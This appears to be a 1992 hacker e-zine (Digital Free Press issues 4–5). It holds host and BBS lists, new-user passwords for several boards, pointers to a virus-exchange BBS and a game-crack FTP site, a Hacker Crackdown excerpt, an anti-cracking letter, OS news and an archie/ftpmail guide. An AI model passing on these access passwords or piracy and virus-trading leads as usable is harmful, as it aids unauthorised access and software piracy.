128.6.60.6                      quartz.rutgers.edu
128.8.2.114                     sayshell.umd.@edu
128.83.132.20                   ??
128.95.136.1                    milton.u.washington.edu
128.100.3.6                     ftp.cs.toronto.edu
128.135.46.7                    ??
128.135.252.7                   ??
128.174.5.50                    @uxc.@cso.@uiuc.@edu
128.214.6.100                   @nic.@funet.fi
128.235.33.1                    ??
128.252.135.4                   @wuarchive.@wustl.@edu
129.173.4.5                     cs.dal.ca
130.18.64.2                     ??
130.43.2.3                      bric-a-brac.apple.com
130.56.96.2                     ??
130.71.192.18                   stolaf.edu
130.234.0.1                     jyu.fi
131.188.31.3                    faui43.informatik.uni-erlangen.de
131.210.1.4                     cs.uwp.edu
133.137.4.3                     ??
134.60.66.21                    ??
134.95.132.2                    aix370.rrz.uni-koeln.de
137.39.1.9                      uunet.uu.net
146.169.3.7                     ??
192.88.144.4                    eff.org
192.88.209.5                    cert.sei.cmu.edu
_____________________________________________________________________________
                                                                  |          |
                                                                  |   BBSes: |
                                                                  |__________|
201.451.3063                    Wrong Number
203.485.0088                    Rune Stone
203.628.9660                    Dark Shadows
206.454.0075                    Manta lair
209.526.3194                    Tequilla Willie's Great Subterranean Carnival
214.324.3501                    KeelyNet
214.522.5321                    Dead Zone
215.449.1902                    Time Enough for Love BBS
303.438.1481                    The Kracker Box
303.871.4824                    Nyx (public access unix)
312.528.5020                    Ripco
401.847.2603                    Underground
414.789.4210                    PC Exec
415.332.6106                    The Well
415.472.5527                    The Cyberden
502.499.8933                    Blitzkrieg
503.635.2615                    Awakening Technology
512.447.4449                    The Illuminati BBS
517.337.7319                    Pure Nihilism
602.861.3167                    Frayed Ends
617.475.6187                    Convent
617.861.8976                    The Works
618.549.4955                    Free Speech
708.672.5426                    World Trade Center
713.242.6853                    Face-2-Face
718.358.9209                    Switchboard
718.428.6776                    Milliways
806.794.4362                    Demon Roach Underground
914.761.6877                    Uncensored
916.673.8412                    Greenpeace's Inverted Granola Bar

--

[Editor's note: The Underground is no longer up (I moved). Perhaps at a
                later date I will put it back up.

Other Boards I know about:

408.241.9760                    NetCom - Network Access

408.245.7726                    darkside.com (The Waffle support BBS)

408.867.7400                    Spies in the Wire
                                Most Notorius hangout for hardened Cyber-
                                Criminals. Ask for access to 'The Good Stuff'
                                and tell them Max sent ya.

602.894.1757                    Unphamiliar Territory
                                NUP (New user Password) 'Bunnylust'

717.361.0947                    Digital Warfare
                                Phalcon-Skism, 40 Hex Mag, Viruses
                                (Sorry, forgot the NUP)

916.481.2306                    Phun Line
                                Password 'Darkness has Fallen'

359.2.20.4198                   Virus eXchange BBS in Sofia, Bulgaria
                                Working hours:
                                    20:00 - 06:00 GMT (in the winter)
                                    19:00 - 05:00 GMT (in the summer)

Also the NUP for Blitzkrieg is 'Columbian Coke'.]
_____________________________________________________________________________
                                                  |                          |
                                                  |  Merchandise/Companies:  |
                                                  |__________________________|

(a lot of the companies on this list are on the very edge of the underground,
and would not exist but for the 1st amendment - please use caution and care
when dealing with these people, and don't abuse them, otherwise you'll ruin it
for us all!)

Abbie Yo-Yo Inc.
PO Box 15
Worcester, MA   01613
           -things related to Abbie Hoffman

Amok
PO Box 861867 Terminal Annex
Los Angeles, CA   90086-1867
             -hard to find/underground books
              catalog is a whopping $9 (400 pages)

Autodesk, Inc.
2320 Marinship Way
Sausalito, CA   94965
           -makers of Chaos software. $59.95

Books by Phone
Box 522
Berkeley, CA   94701
800.858.2665 (orders)
510.548.2124 (info)
           -large library of hard-to-find books related to CP, drugs, etc.
            nice resource, but you pay a lot for it :-)

Consumertronics
2011 Crescent Dr.
PO Drawer 537
Alamogordo, NM   88310
505.434.0234
500.434.0234 (fax - orders only)
             -hacking/phreaking manuals

Feral House Productions
PO Box 861893
Los Angeles, CA 90086-1893
        -obscure books

Further Connections
Waves Forest
PO Box 768
Monterey, CA 93940
        -fringe science

Kodak's Center for Creative Imagining
800.428.7400
        -offers classes in electronic imaging "taught by artists and industry
                experts with state-of-the-art technology"
         anyway, call 'em and ask 'em for their catalogue - might be decent
         (at least the ad in Mondo looks nifty :-)

Loopmanics, Ltd.
PO Box 1197
Port Townsend, WA   98368
     -carries a large collection of underground/hard-to-find books and stuff
      send for a catalog

NewTek, Inc.
215 SE 8th St.
Topeka, KS   66603
800.843.8934
        -makers of the great Video Toaster
         send 'em $4.95 for a demo tape of what the Video Toaster does

Paladin Press
PO Box 1307
Boulder, CO 80306
        -obscure books

Re/Search Publications
70 Romolo Street #B
San Franssico, CA 94133

Rip Off Press
PO Box 4686
Auburn, CA 96504

Sense8
1001 Bridgeway #477
sausalito, CA   94965
415.331.6318
415.331.9148 (fax)
             -vr firm

Survival Books
11106 Magnolia Blvd.
North Hollywood, CA 91601

TOPYUS (Psychic TV)
PO Box 18223
Denver, CO   80218
        -Genesis P-Orridge's Psychic TV
         send a SASE for info on Psychic TV, catalogs, albums, t-shirts,
              videos, books, etc.

Virtual Research
1313 Socorro Ave
Sunnyvale, CA   94089
408.739.7114
        -a vr firm

VPL Research, Inc.
656 Bair Island Rd. Suite 304
Redwood, CA   94063
415.361.1710
        -Jaron Lanier's famous virtual reality firm

Zentech
Box 138
Morgan Bay Rd.
Surry, ME    04684
       -cyberpunk, virtual reality merchandise

_____________________________________________________________________________
                                                                 |           |
                                                                 |  see ya!  |
                                                                 |___________|
Welp, that looks like it for now.  Have fun!

Again, if you have any questions/comments/concerns/criticisms/corrections or
any additional info, please contact me at ahawks@nyx.cs.du.edu - or on The
Kracker Box BBS at 303.438.1481.

I can be reached at:  ahawks@nyx.cs.du.edu, or ahawks@isis.cs.du.edu.

------------------------------------------------------------------------------
##############################################################################
------------------------------------------------------------------------------

    Personal Notes: Hello to the RI Hackers from the New Texas Hacker.
                    Metacom2 send me mail!

    Well folks, thats all for DFP #4.

    Keep that e-mail coming!


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 -= Max Cray =-                                           Freedom
 Net:     underg%max@uunet.uu.net                         Justice
 UUCP:    ...!uunet!underg!max                            Equality
 CI$:     76334,2203                                      Responsibility

 ---------------------------------------------------------------------

        #########           ############       #########
        ###########         ############       ###########
        ####    ####        ####               ####    ####
        ####    ####        ####               ####    ####
        ####    ####        ########           ###########
        ####    ####        ########           #########
        ####    ####        ####               ####
        ####    ####        ####               ####
        ###########         ####               ####
        #########           ####               ####

                         DIGITAL FREE PRESS
---------------------------------------------------------------------
                Volume 1.0                Issue 5.0
---------------------------------------------------------------------

   * A Publication of The Underground Computing Foundation (UCF) *

      * Send Subscription Requests to: dfp-req@underg.ucf.org *

          * Send Submissions to: hackers@underg.ucf.org *

             * Editor: Max Cray (max@underg.ucf.org) *

    Back issues can be found in the CUD archives at ftp.eff.org

             * Underground Computing Foundation BBS *

                         (512) 339-8221

---------------------------------------------------------------------

                Statement of Purpose and Disclaimer

    The  Digital  Free  Press  is an uncensored forum to document the
exploration  of  the  world  of  modern technology.   It is published
under the premise that it is better to know, rather than not know, so
no  attempt  is made to hide any information. Information is a double
edged  sword. It is neither good nor bad, and can be used for either.
Use  any  information  provided  at  your own risk.  Articles are the
opinion  of  the  authors  listed,  and  not of the editor (unless of
course  the  editor  wrote  it).   Information is not always verified
for accuracy.

---------------------------------------------------------------------
---------------------------------------------------------------------

In this Issue:

    1. Mail to Max
    2. Excerpt from 'The Hacker Crackdown' by Bruce Sterling
    3. Letter from Famous Hacker to Not So Famous Cracker
    4. (USL vs. BSDI) & CMU (Mach) by Max Cray
    5. Windows NT Info by Max Cray
    6. Game Cracking FTP Site
    7. New Cypherpunks Mailing List
    8. How to get software via Mail by Ram Raider

---------------------------------------------------------------------
#####################################################################
---------------------------------------------------------------------

Mail to Max:
-----------

From: gator.rn.com!sara (Sara Gordon)
Subject: vx bbs in sofia
To: underg!max@iuvax (Max Cray)
Date: Thu, 21 May 92 0:16:44 EST
X-Mailer: ELM [version 2.3 PL11]

you have incorrect information. todor's system is down due to
loss of hardware at last report. if you dial, you will get
only the satellite noise. he has not any new viruses anyway.

--
_____________________________________________________________________
well its too late, tonite, to drag the past out into the light. we're
one, but we're not the same...
________________________sara@gator.rn.com____________________________

[Editor's comment: Who is Sara really, and how come the dudes at
                   Phrack do not like her? - Max]

---------------------------------------------------------------------
#####################################################################
---------------------------------------------------------------------

[Editor's note:  I got a book cover from Bruce when I met him at an
 EFF-Austin CyberDawg Event last month. The following excerpts come
 from that  cover. The book should be released by the time you read
 this:  Bantam Books, 666 Fifth Avenue, New York, New York, 10103.]

---------------------------------------------------------------------

                     THE HACKER CRACKDOWN
          Law and Disorder on the Electronic Frontier
                      by Bruce Sterling

--

   The AT&T long distance network crashes, and millions of calls go
unanswered. A computer hacker reprograms a switching station, and
calls to a Florida probation office are shunted to a New York
phone-sex hotline. An underground computer bulletin board publishes a
pilfered BellSouth document on the 911 emergency system, making it
available to anyone who dials up. How did so much illicit power reach
the hands of an undisciplined few - and what should be done about it?

   You are about to descend into a strange netherworld - one that
sprang into existence when computers were first connected to
telephones. This place has no physical location; it exists only in
the networks that bind together its population. Like any frontier,
it is home to a wide range of personalities, from legitimate computer
professionals to those known only by their _noms de net_: denizens
like Knight Lightning, Leftist, Compu-Phreak, Major Havoc, and
Silver Spy; groups like the Lords of Chaos, Phantom Access
Associates, Shadow Brotherhood, and the Coalition of Hi-Tech Prates.
This is not normal space, but "cyberspace." And if you use a
computer, cyberspace is moving inexorably closer to you with each
passing day.

--

   This is a book about cops, and wild teenage whiz-kids, and
lawyers, and hairy-eyed anarchists, and industrial technicians, and
hippies, and high-tech millionaires, and game hobbyists, and security
experts, and Secret Service agents, and grifters, and thieves.
   This book is about the electronic frontier of the 1990s. It
concerns activities that take place inside computer and over tele-
phone lines - "Cyberspace."
   People have worked on this "frontier" for generations now. Some
people became rich and famous from their efforts there. Some just
played in it, as hobbyists. Others soberly pondered it, and wrote
about it, and regulated it, and negotiated over it in international
forums, and sued one another about it in gigantic, epic court battles
that lasted for years. And since the beginning, some people have
committed crimes in this place.
   This is the story of the people of cyberspace.

--

   The Computer Fraud and Abuse Task Force, led by federal prosecutor
William J. Cook, had started in 1987 and swiftly became one of the
most aggressive local "dedicated computer-crime units." Chicago was a
natural home for such a group. The world's first computer bulletin-
board system had been invented in Illinois. The state of Illinois had
some of the nation's first and sternest computer crime laws. Illinois
State Police were markedly alert to the possibilities of white-collar
crime and electronic fraud.
   Throughout the 1980s, the federal government had given prosecutors
an armory of new, untried legal tools against computer crime. Cook
and his colleagues were pioneers in the use of these new statutes in
the real-life, cut-and-thrust of the federal courtroom.
   On October 2, 1986, the U.S.Senate passed the Computer Fraud and
Abuse Act unanimously, but there had been pitifully few convictions
under this statute. Cook's group took their name from this statute,
because they were determined to transform this powerful, but rather
theoretical act of Congress into a real-life engine of legal
destruction against computer fraudsters and scofflaws.
   It was not a question of merely discovering crimes, investigating
them and then trying to punish their perpetrators. The Chicago unit,
like most everyone else in the business, already _knew_ who the bad
guys were: the Legion of Doom, and the writers and editors of PHRACK.
The task at hand was to find some legal means of putting these
characters away.
   Fry Guy had broken the case wide open and alerted telco security
to the scope of the problem. But Fry Guy's crimes would not put the
Atlanta Three behind bars - much less the whacko underground
journalist of PHRACK. So on July 22, 1989, the same day that Fry Guy
was raided in Indiana, the Secret Service descended upon the Atlanta
Three.
   Likely this was inevitable. By the summer of 1989, law enforcement
was closing in on the Atlanta Three from at least six directions at
once. First, there were the leads from Fry Guy, which had led to the
DNR registers being installed on the lines of the Atlanta Three. The
DNR evidence alone would have finished them off, sooner or later.
   But second, the Atlanta lads were already well known to Control-C
and his telco security sponsors. LoD's contacts with telco security
had made its members overconfident and even more boastful than usual;
they felt that they had powerful friends in high places, and that
they were being tolerated openly by telco security. But BellSouth's
Intrusion Task Force were hot on the trail of LoD and sparing no
effort or expense.
   The Atlanta Three had also been identified by name and listed on
the extensive antihacker files maintained, and retailed for pay, by
private security operative John Maxfield of Detroit. Maxfield who had
extensive ties to telco security and many informants in the under-
ground, was a bete noire of the PHRACK crowd, and the dislike was
mutual.
   The Atlanta Three themselves had written articles for PHRACK. This
boastful act could not possibly escape telco and law enforcement
attention.
   "Knightmare," a high school-age hacker from Arizona, was a close
friend and disciple of Atlanta LoD, but he had been nabbed by the
formidable Arizona Organized Crime and Racketeering unit. Knightmare
was on some of LoD's favorite boards - "Black Ice" in particular -
and was privy to their secrets. And to have Gail Thackeray, the
assistant attorney general of Arizona, on one's trail was a dreadful
peril for any hacker.
   And perhaps worst of all, Prophet had committed a major blunder by
passing an illicitly copied BellSouth computer file to Knight
Lightning, who had published it in PHRACK. This as we will see, was
an act of dire consequence for almost everyone concerned.
   On July 22, 1989, the Secret Service showed up at Leftist's house,
where he lived with his parents. A massive squad of some twenty
officers surrounded the building: the Secret Service, federal
marshals, local police, possibly BellSouth telco security; it was
hard to tell, in the crush. Leftist's dad, at work in his basement
office, first noticed a muscular stranger in plain clothes crashing
through the backyard with a drawn pistol. As more strangers poured
into the house, Leftist's dad naturally assumed there was an armed
robbery in progress.
   Like most hacker parents, Leftist's mom and dad only had the
vaguest notions of what their son had been up to all this time.
Leftist had a day job repairing computer hardware. His obsession with
computers seemed a bit odd, but harmless enough, and likely to
produce a well paying career. The sudden, overwhelming raid left
Leftist's parent traumatized.
   Leftist himself had been out after work with hos co-workers,
surrounding a couple of pitchers of margaritas. As he came trucking
on tequila numbed feet up the pavement, toting a bag full of floppy
disks, he noticed a large number of unmarked cars parked in his
driveway. All the cars sported tiny microwave antennas.
   The Secret Service had knocked the front door off its hinges,
almost flattening his mom.
   Inside, Leftist was greeted by Special Agent James Cool of the
U.S. Secret Service, Atlanta office. Leftist was flabbergasted. He'd
never met a Secret Service agent before. He could not imagine that
he'd ever done anything worthy of federal attention. He'd always
figured that if his activities became intolerable, one of his
contacts in telco security would give him a private phone call and
tell him to knock it off.
   But now Leftist was pat-searched for weapons by grim pro-
fessionals, and his bag of floppies was quickly seized. He and his
parents were all shepherded into separate rooms and grilled at length
as a score of officers scoured their home for anything electronic.
   Leftist was horrified as his treasured IBM AT personal computer,
with its forty-meg hard disk, and his recently purchased 80386 IBM
clone with a whopping hundred-meg hard disk both went swiftly out the
door in Secret Service custody. They also SEIZED all his disks, all
his notebooks, and a tremendous booty of dog eared telco documents
that leftist snitched from trash Dumpsters.
   Leftist figured the whole thing for a big misunderstanding. He'd
never been into _military_ computers. He wasn't a spy or a
Communist_. He was just a good ol'Georgia hacker, and now he just
wanted all these people out of the house. But it seemed they wouldn't
go until he made some kind of statement.
   And so, he leveled with them.
   And that, Leftist said later from his federal prison camp in
Talladega, Alabama, was a big mistake.

--

   Your guide on this journey is bestselling science fiction author
and longtime computer user Bruce Sterling, who was galvanized into
action following the massive "hacker crackdowns" of 1990, in which
law enforcement officers executed search warrants across the country
against law breakers - and suspected lawbreakers - in the computer
underground. In THE HACKER CRACKDOWN, Sterling - respected by
hackers, law officers, and civil libertarians alike - uses his unique
reportorial access and his considerable powers as a novelist to weave
a startling narrative that informs, compels, and appalls.

Sterling has researched all corners of this challenging and contro-
versial new world for this book. In it we meet outlaws and cops,
bureaucrats and rebels, geniuses and grifters: all denizens of a
dazzling electronic land, a vast and fascinating new frontier
equally threatened by outlawry and government intervention. THE
HACKER CRACKDOWN is a laser-sharp dispatch from the edge of tech-
nology - and the edge of freedom.

BRUCE STERLING is the bestselling co-author (with William Gibson) of
THE DIFFERENCE ENGINE. His solo novels include INVOLUTION OCEAN, THE
ARTIFICIAL KID, SCHISMATRIX, and ISLANDS IN THE NET. He edited
MIRRORSHADES, the definitive "cyberpunk" anthology. He lives with his
family in Austin, Texas.

--

"Sterling artfully separates myth from fact and does justice to both
in the chaotic world of the electronic frontier. You must read this
for the real story about hackers, cops, and the opening of cyber-
sapce."

Mitch Kapor
Founder of Lotus Development Corp
President of Electron Frontier Foundation

--

"A fascinating evaluation of high-tech crime."

Steven R. Purdy
Retired U.S. Secret Service (Fraud Division, Electronic Crimes)
Former Chairman, Federal Computer Investigation Committee

--

"I learned a lot of things I didn't know from this book."

"Lex Luthor"
Founder "Legion of Doom"

--

"Is that really Knight Lighting on the cover?"

"Max Cray"
Editor Digital Free Press

---------------------------------------------------------------------
#####################################################################
---------------------------------------------------------------------

       LETTER FROM FAMOUS HACKER TO NOT SO FAMOUS CRACKER


The password file on an ordinary UNIX is called /etc/passwd.
However, Suns have another separate file which is shared.  People
have been moving that file around, and I'm not sure under what name
it would appear these days except on the server, where (I believe)
only root can log in.

I don't know the details of how the machines share their passwd file.
That software is proprietary, and I don't look inside it because I
don't want to be sued someday for writing free software to do such a
thing.

I can't help you get into MIT.  I don't have any connection with MIT.
MIT lets me and the other GNU people use their offices and machines
because they like the free software that we write.

I can make a legitimate account for you, on the AI lab machines at
least.

However, it seems to me that you may not really understand what to do
with an account once you have one.  Judging from the files you have,
the only thing you have been doing with my account is looking for
other accounts whose passwords you can guess.  I don't think this is a
good sign.

Please don't misunderstand.  I don't think it is evil to break
security.  You can see from the way I set my password how much I care
about security.  However, I think it is bad for your own head to be
focused on security breaking.  What I'm worried about is whether you
can get your head out of there and into a better place to be.

The security breaking game is something that you "play" against other
people.  They try to keep you out, and you try to get in.  Playing
this game, you can get stuck in thinking in terms of conflict and of
who is going to win.  This isn't good for your head.  It also causes
you not to see the interest in all the other things you can do with a
computer.  Like a master spy sneaking through the Grand Canyon and
being too obsessed with spying to notice the beauty of the place.

Collecting passwords is also futile.  You seem to get someplace--such
as, a machine you couldn't get to before--but one machine is much
like another, and each place you go is no better than where you were
before.  Why try hard to get to someplace if it is only a way station
to another way station to ..., and there is no destination, no goal?
In a way, you are like a person who has one new car but can never
drive to visit his friends or to go to work because he is constantly
driving around looking for another similar car to buy as a
replacement.

I might try to break security if I had a constructive reason to, but
it has been many years since I had one.  So I don't think about
breaking security, because I have so much else to do (writing free
software).

Anyway, I'm willing to make an account for you, but I'd like you to
look into something to do with it besides look for other accounts to
use.

Also, if we are to be users together, then we need to start
developing trust.  For example, you could tell me how to phone you,
so we can talk directly.  (No danger in this, since you haven't
broken any laws by logging in on my account or Puzo's.  We both let
you do it.)

---------------------------------------------------------------------
#####################################################################
---------------------------------------------------------------------

                       (USL vs BSDI) & MACH

                            by Max Cray


   Unix System Laboratories, the spinoff of the phone giant ATT has
sued BSDI, a software company that has been creating a commercial
version of unix from the free University of California at Berkeley
source code. This lawsuit was a big discussion item in comp.org.eff
.talk. I am not sure what to think of this lawsuit and I do not
think it is clear what ATT is claiming.

    I do know that even if ATT is way off base with their claims
that damage is being done to the computer community. For example
Carnegie Mellon University makes a free operating system microkernal
called MACH. A microkernal is just the core of an operating system;
you also need a file system, etc. CMU also created a server from the
free BSD unix code to provide unix services on top of MACH. The
Free Software Foundation (FSF) was going to use the BSD server on
top of MACH for its project GNU (GNUs Not Unix, recursive acronym,
an MIT gimmick) operating system. The server was never officially
released to the masses, because it was not easily installed, since
there was no boot disk, etc.

   Anyway this is where the underground scene comes in. Just as it
looked like we were all going to have a very sophisticated free
operating system CMU decided to not continue the BSD server project
for MACH, and to no longer make it available, because of the lawsuit
over BSD code. Those that have the code are free to continue to use
it. The code itself is difficult to get a hold of, since it was never
actually officially released. For a while it was in the /tmp of
ftp.uu.net (always interesting stuff to be found there...) in a file
called xyzzy.tar.Z where I was able to get a copy of it. I uploaded
it to the Unix forum on CompuServe, but it got deleted. You can still
get it from the UCF BBS. There does seem to be a small cadre of
hackers who want to continue to develop it into a viable operating
system. Unfortunately the FSF is no longer going to be involved. Read
comp.os.mach for the latest developments. Also when they call to ask
you to change your phone service back to ATT be sure to give them a
piece of your mind, and tell them Max sent ya.

---------------------------------------------------------------------
#####################################################################
---------------------------------------------------------------------


                -= Microsoft Windows (New Technology) =-

                            by Max Cray


   Why not use be the first one on your block to use Windows NT?
Where else can you get a high performance 32-bit OS with TCP/IP and
development tools for only $69? If you have the hardware, you can't
miss this deal! Read on.

Here are the facts:


-= MINIMUM CONFIGURATION =-------------------------------------------


- 80386 or R4000 CPU.
    (No mention of 386SX, I assume because they would prefer you to
     use a faster CPU to make the new OS shine, a 33 MHz CPU is
     recommended for software development).

- 8 Meg of RAM (12 Meg recommended for software development).
    This does not include space for applications.

- 55 Meg Hard Drive Space (20 Meg for Swap File, 100 MB recommended
    for software development).

It only comes on CD-ROM, so you will need a CD-ROM device to at least
install it. You can get away with borrowing a friend's. You do not
need the CD-ROM to run it.


-= FEATURES =--------------------------------------------------------


- Portable (at source code level for R4000 CPU now, DEC Alpha CPU
    promised).
- 32 bit flat address space.
- Basically the same Application Programming Interface (API) as
    MS Windows 3.1.
- Multi-Threaded
- Preemptive Multitasking.
- Built-in Network Support (Remote Procedure Calls (RPC), named
    pipes)
- Symmetric multi-processing (If your app uses threads, it will
    automatically take advantage of multiple CPUs).
- Security (Editor's note: Noooooo...)
- Memory protection.
- Fault tolerance.
- Win32 GDI drawing API.
- Structured exception handling, memory mapped files, and
    Unicode (?).
- Will run 32 bit win apps, ms-dos apps, win apps, posix, and OS/2
    16 bit character based apps.


-= SDK =-------------------------------------------------------------


- Comes with C/C++ compiler, and same documentation as C/C++ 7.0.
- WinDbg (Windows Debugger).
- Microsoft Editor.
- Macro Assembler for both Intel and R4000 architectures.
- Comes with the usual Windows SDK tools (Resource editors and
    compilers, etc).
- SDK docs include:
   The Windows Interface: An application guide.
   Win32 Programmer's Reference - Overview
   Win32 Programmer's REFERENCE - API Part 1
   Win32 Programmer's REFERENCE - API Part 2
   RPC Programmer's Guide and REFERENCE


-= SUPPORT =---------------------------------------------------------


There is a forum on Compuserve for support (GO WINNT). You can down-
load the latest list of compatible systems, and devices there. There
is also a programming forum called (MSWIN32).

Also there a a newsgroup on Usenet:

    comp.os.ms-windows.programmer.win32


There are some files available at ftp.uu.net:

    ~ftp/vendor/microsoft/...


-= COST =------------------------------------------------------------


- $69 + $20 (freight) + state sales tax
    CD Rom disk (postscript docs on disk)

- $399 + $40 (FREIGHT) + state sales tax
    CD Rom disk and hardcopy docs

Call 1-800-227-4679 to order. I had to tell them that I received a
mailing, and that there was a code above my name: QA7FA which means
that I am a unix developer. I was told that there would be up to 4
releases before the final production. The advertisement clearly
states that I would receive a copy of the final Win NT SDK, and
Operating system, but not the compiler.

By purchasing the Win32 SDK you will receive preliminary and final
versions of the Windows NT operating system and SDK tools in addition
to preliminary versions of a C/C++ compiler.

The cost of the Win32 SDK with printed documentation is $399. A
CD-only version containing the documentation in PostScript format is
also available for $69. (If you later decide that you want the
hard-copy documentation from Microsoft, there is a coupon in the box
for you to order it for $359 plus freight.) To order from within the
U.S, please call Microsoft Developer Services at (800) 227-4679. In
Canada, call (800) 563-9048. In all other countries, contact your
local Microsoft representative.

There will be a very broad Beta program in the early fall that is
intended for end-users.  The beta release will include full support
for MS-DOS, 16-bit Windows and POSIX applications.  Further informa-
tion about the beta program will be posted to the WINNT forum on
CompuServe when it becomes available.

---------------------------------------------------------------------
#####################################################################
---------------------------------------------------------------------

                     FTP SITE FOR GAME CRACKS

>From the rec.ibm.pc.games FAQ:

Okay, I now have an anonymous ftp site for cracks, cheats, etc.
Currently, my entire database of cracks is there in one big ugly
file. Eventually, I will break it up into individual entries.  Also,
a fairly recent wanted list is in /pub/incoming/cracks/wanted, so if
you have any cracks that are on the want list, please upload them to
/pub/incoming/cracks.  I will check all of the stuff that I can that
comes into incoming, but I make no guarantees.  Please read the
README file for more details.

The name?

romulus.mercury.andrew.cmu.edu
aka
128.2.35.159

Have fun...

    P.S.  For now, I'll just deal with IBM stuff.  Please don't upload
    non-ibm-related things.  Perhaps later, I'll consider it.


---------------------------------------------------------------------
#####################################################################
---------------------------------------------------------------------


                    CYPHERPUNKS MAILING LIST


The cypherpunks list is a forum for discussion about technological
defenses for privacy in the digital domain.

Cypherpunks assume privacy is a good thing and wish there were more
of it.  Cypherpunks acknowledge that those who want privacy must
create it for themselves and not expect governments, corporations, or
other large, faceless organizations to grant them privacy out of
beneficence.  Cypherpunks know that people have been creating their
own privacy for centuries with whispers, envelopes, closed doors, and
couriers.  Cypherpunks do not seek to prevent other people from
speaking about their experiences or their opinions.

The most important means to the defense of privacy is encryption. To
encrypt is to indicate the desire for privacy.  But to encrypt with
weak cryptography is to indicate not too much desire for privacy.
Cypherpunks hope that all people desiring privacy will learn how best
to defend it.

Cypherpunks are therefore devoted to cryptography.  Cypherpunks wish
to learn about it, to teach it, to implement it, and to make more of
it.  Cypherpunks know that cryptographic protocols make social
structures.  Cypherpunks know how to attack a system and how to
defend it.  Cypherpunks know just how hard it is to make good
cryptosystems.

Cypherpunks love to practice.  They love to play with public key
cryptography.  They love to play with anonymous and pseudonymous mail
forwarding and delivery.  They love to play with DC-nets.  They love
to play with secure communications of all kinds.

Cypherpunks write code.  They know that someone has to write code to
defend privacy, and since it's their privacy, their going to write
it.  Cypherpunks publish their code so that their fellow cypherpunks
may practice and play with it.  Cypherpunks realize that security is
not built in a day and are patient with incremental progress.

Cypherpunks don't care if you don't like the software they write.
Cypherpunks know that software can't be destroyed.  Cypherpunks know
that a widely dispersed system can't be shut down.

Cypherpunks will make the networks safe for privacy.

To subscribe send mail to:

    cypherpunks-request@toad.com


---------------------------------------------------------------------
#####################################################################
---------------------------------------------------------------------


                      SNARFING FILES BY MAIL

                          by Ram Raider
                       (rr@underg.ucf.org)

    Okay, that great text file on Internet dialouts by mail is only
available by ftp from ftp.foobar.org. You can no longer use the MIT
Terminus server to get to your account at the Free Software
Foundation. Your only remaining alternative is to sneak into the
university computer center. This time you will get caught for sure.

    Wait a minute. Before you leave let me tell you how to do it with
your mail account. Actually it is pretty easy to do using a combina-
tion of an archie server, and the ftpmail service. Remember:

                     Archie + ftpmail = files

    OK, now that you have the essential formula down, you may be
wondering what archie, and ftpmail are. Before I go on, I must
confess: all this info was taken directly from the help files of
these services.

    Also DO NOT stop reading this article just because you do not
have an Internet mail account. If you have a mail account almost
ANYWHERE you can use this technique. This means from your Compu$erve
account, or MCI mail account, or whatever, but not Prodigy. For the
complete information on mail gateways send mail to:

    mail-server@pit-manager.mit.edu

with the line:

    send usenet/comp.mail.misc/Inter-Network_Mail_Guide

There. Now, not only can you get files from the Internet, but by
mixing and matching mail gateways you can send mail to just about
anyone with a computer and modem. For example from your MCI mail
account you could send mail to someone on a fidonet node, by routing
it through the Internet, etc.

Getting back to snarfing files, I would also like to point out that
by using the archie + ftpmail combination you can get binary files,
too, not just text files. There are A LOT of files out there
available on the Internet. Let us hope that you do not pay much for
your mail account.

ARCHIE

    Archie is a file locator service. To get a file you must know the
exact location and name of your file. An archie server maintains a
database of files available by anonymous ftp from Internet sites.

   To use it send mail to archie@ where site.name is one
of the following sites:

    archie.mcgill.ca           (Canada)
    archie.funet.fi            (Finland/Eur.)
    archie.au                  (Aussie/NZ)
    archie.cs.huji.ac.il       (Israel)
    archie.doc.ic.ac.uk        (UK/Ireland)
    archie.sura.net            (USA [MD])
    archie.unl.edu             (USA [NE])
    archie.ans.net             (USA [NY])
    archie.rutgers.edu         (USA [NJ])

    To use the archie server you list commands in your mail message.
Command lines begin in the first column. All lines that do not match
a valid commands are ignored. If a message not containing any valid
requests or an empty message is received, it will be considered to be
a 'help' request. The server recognizes six commands:

help            Send this command to get a help textfile. Note that
                the "help" command is exclusive. All other commands
                in the same message are ignored.

path      This lets the requester override the address that
                would normally be extracted from the header.  If you
                do not hear from the archive server within oh, about
                2 days, you might consider adding a "path" command to
                your request.  The path describes how to mail a
                message from the archie server to your address.
                Archie servers are fully connected to the Internet.

    BITNET users can use the convention

      user@site.BITNET

    UUCP user can use the convention

      user@site.uucp

                This is actually quite useful. For example, I have an
                account that most of my mail goes to and comes from
                that I pay for, and another account from the local
                unix user group that I do not pay for. Using this
                command I can route the mail through the free
                account.

prog  [ ...]

    A search of the "archie" database is performed with
                each  in turn, and any matches found are
                returned to the REQUESTER. Note that multiple
                 may be placed on one line.

                 stands for "regular expression". Another
                name for it in the DOS world is wildcard. All it
                means is that you can search for files without
                knowing the exact name. '*' matches all occurrences,
                and '?' matches a single character.

                For example: prog dfp* would send a listing of all
                files and directories that begin with the letters
                'dfp'.

    Any regular expression containing spaces must be
                quoted with single (') or double (") quotes.

    The searches are CASE SENSITIVE. The ability to
                change this will hopefully be added soon to the
                archie software.

site  | 

    A listing of the given  will be returned.
                The fully qualified domain name or IP address may be
                used.

                This command is used to limit your search to one
                particular site. Unfortunately it can not be used to
                get a listing of all the files at a site.

compress  ALL of your files in the current mail message will be
    "compressed" and "uuencoded". When you receive the
                reply, remove everything before the "begin" line and
                run it through  "uudecode". This will produce a .Z
                file. You can then run "uncompress" on this file and
                get the results of your request.

                You can use this command to compress your return
                info. Again, useful if you pay for your mail.

                If you do not have uncompress, and/or uudecode
                program, you can get source code files in ascii
                format, and then compile them. For example, use the
                command 'prog uncompress.c', and use the ftpmail
                service to get the file. and then compile the source
                file to get the binary program. If you are unable
                to compile the program, see your local guru.

                Compress files are files that have been run through
                an algorithm to (you guess it) compress the file.
                This makes the file into a binary file. That is where
                the uudecode program comes in. This program converts
                a binary file into an ascii file so that it can be
                mailed. As a minimum you must get the uudecode
                utility to decode binary files if you want to get
                programs from the Internet, as well as text files.

quit            Nothing past this point is interpreted. This is
                provided so that the occasional lost soul whose
                signature contains a line that looks like a command
                can still use the server without getting a bogus
                response.

Results are sorted by archive hostname in lexical order. You will get
a listing back that looks like this:

--

Sorting by hostname

Search request for 'Internet-Mail-Dialouts'

Host ftp.foobar.org   (130.43.2.3)
Last updated 01:04  5 Sep 1992

   Location: /pub/G-Files/Hacking4$
     FILE    rw-r--r--   36466  Jun 30 18:12   Internet-Mail-Dialouts

Host tmrc.mit.edu   (128.23.2.4)
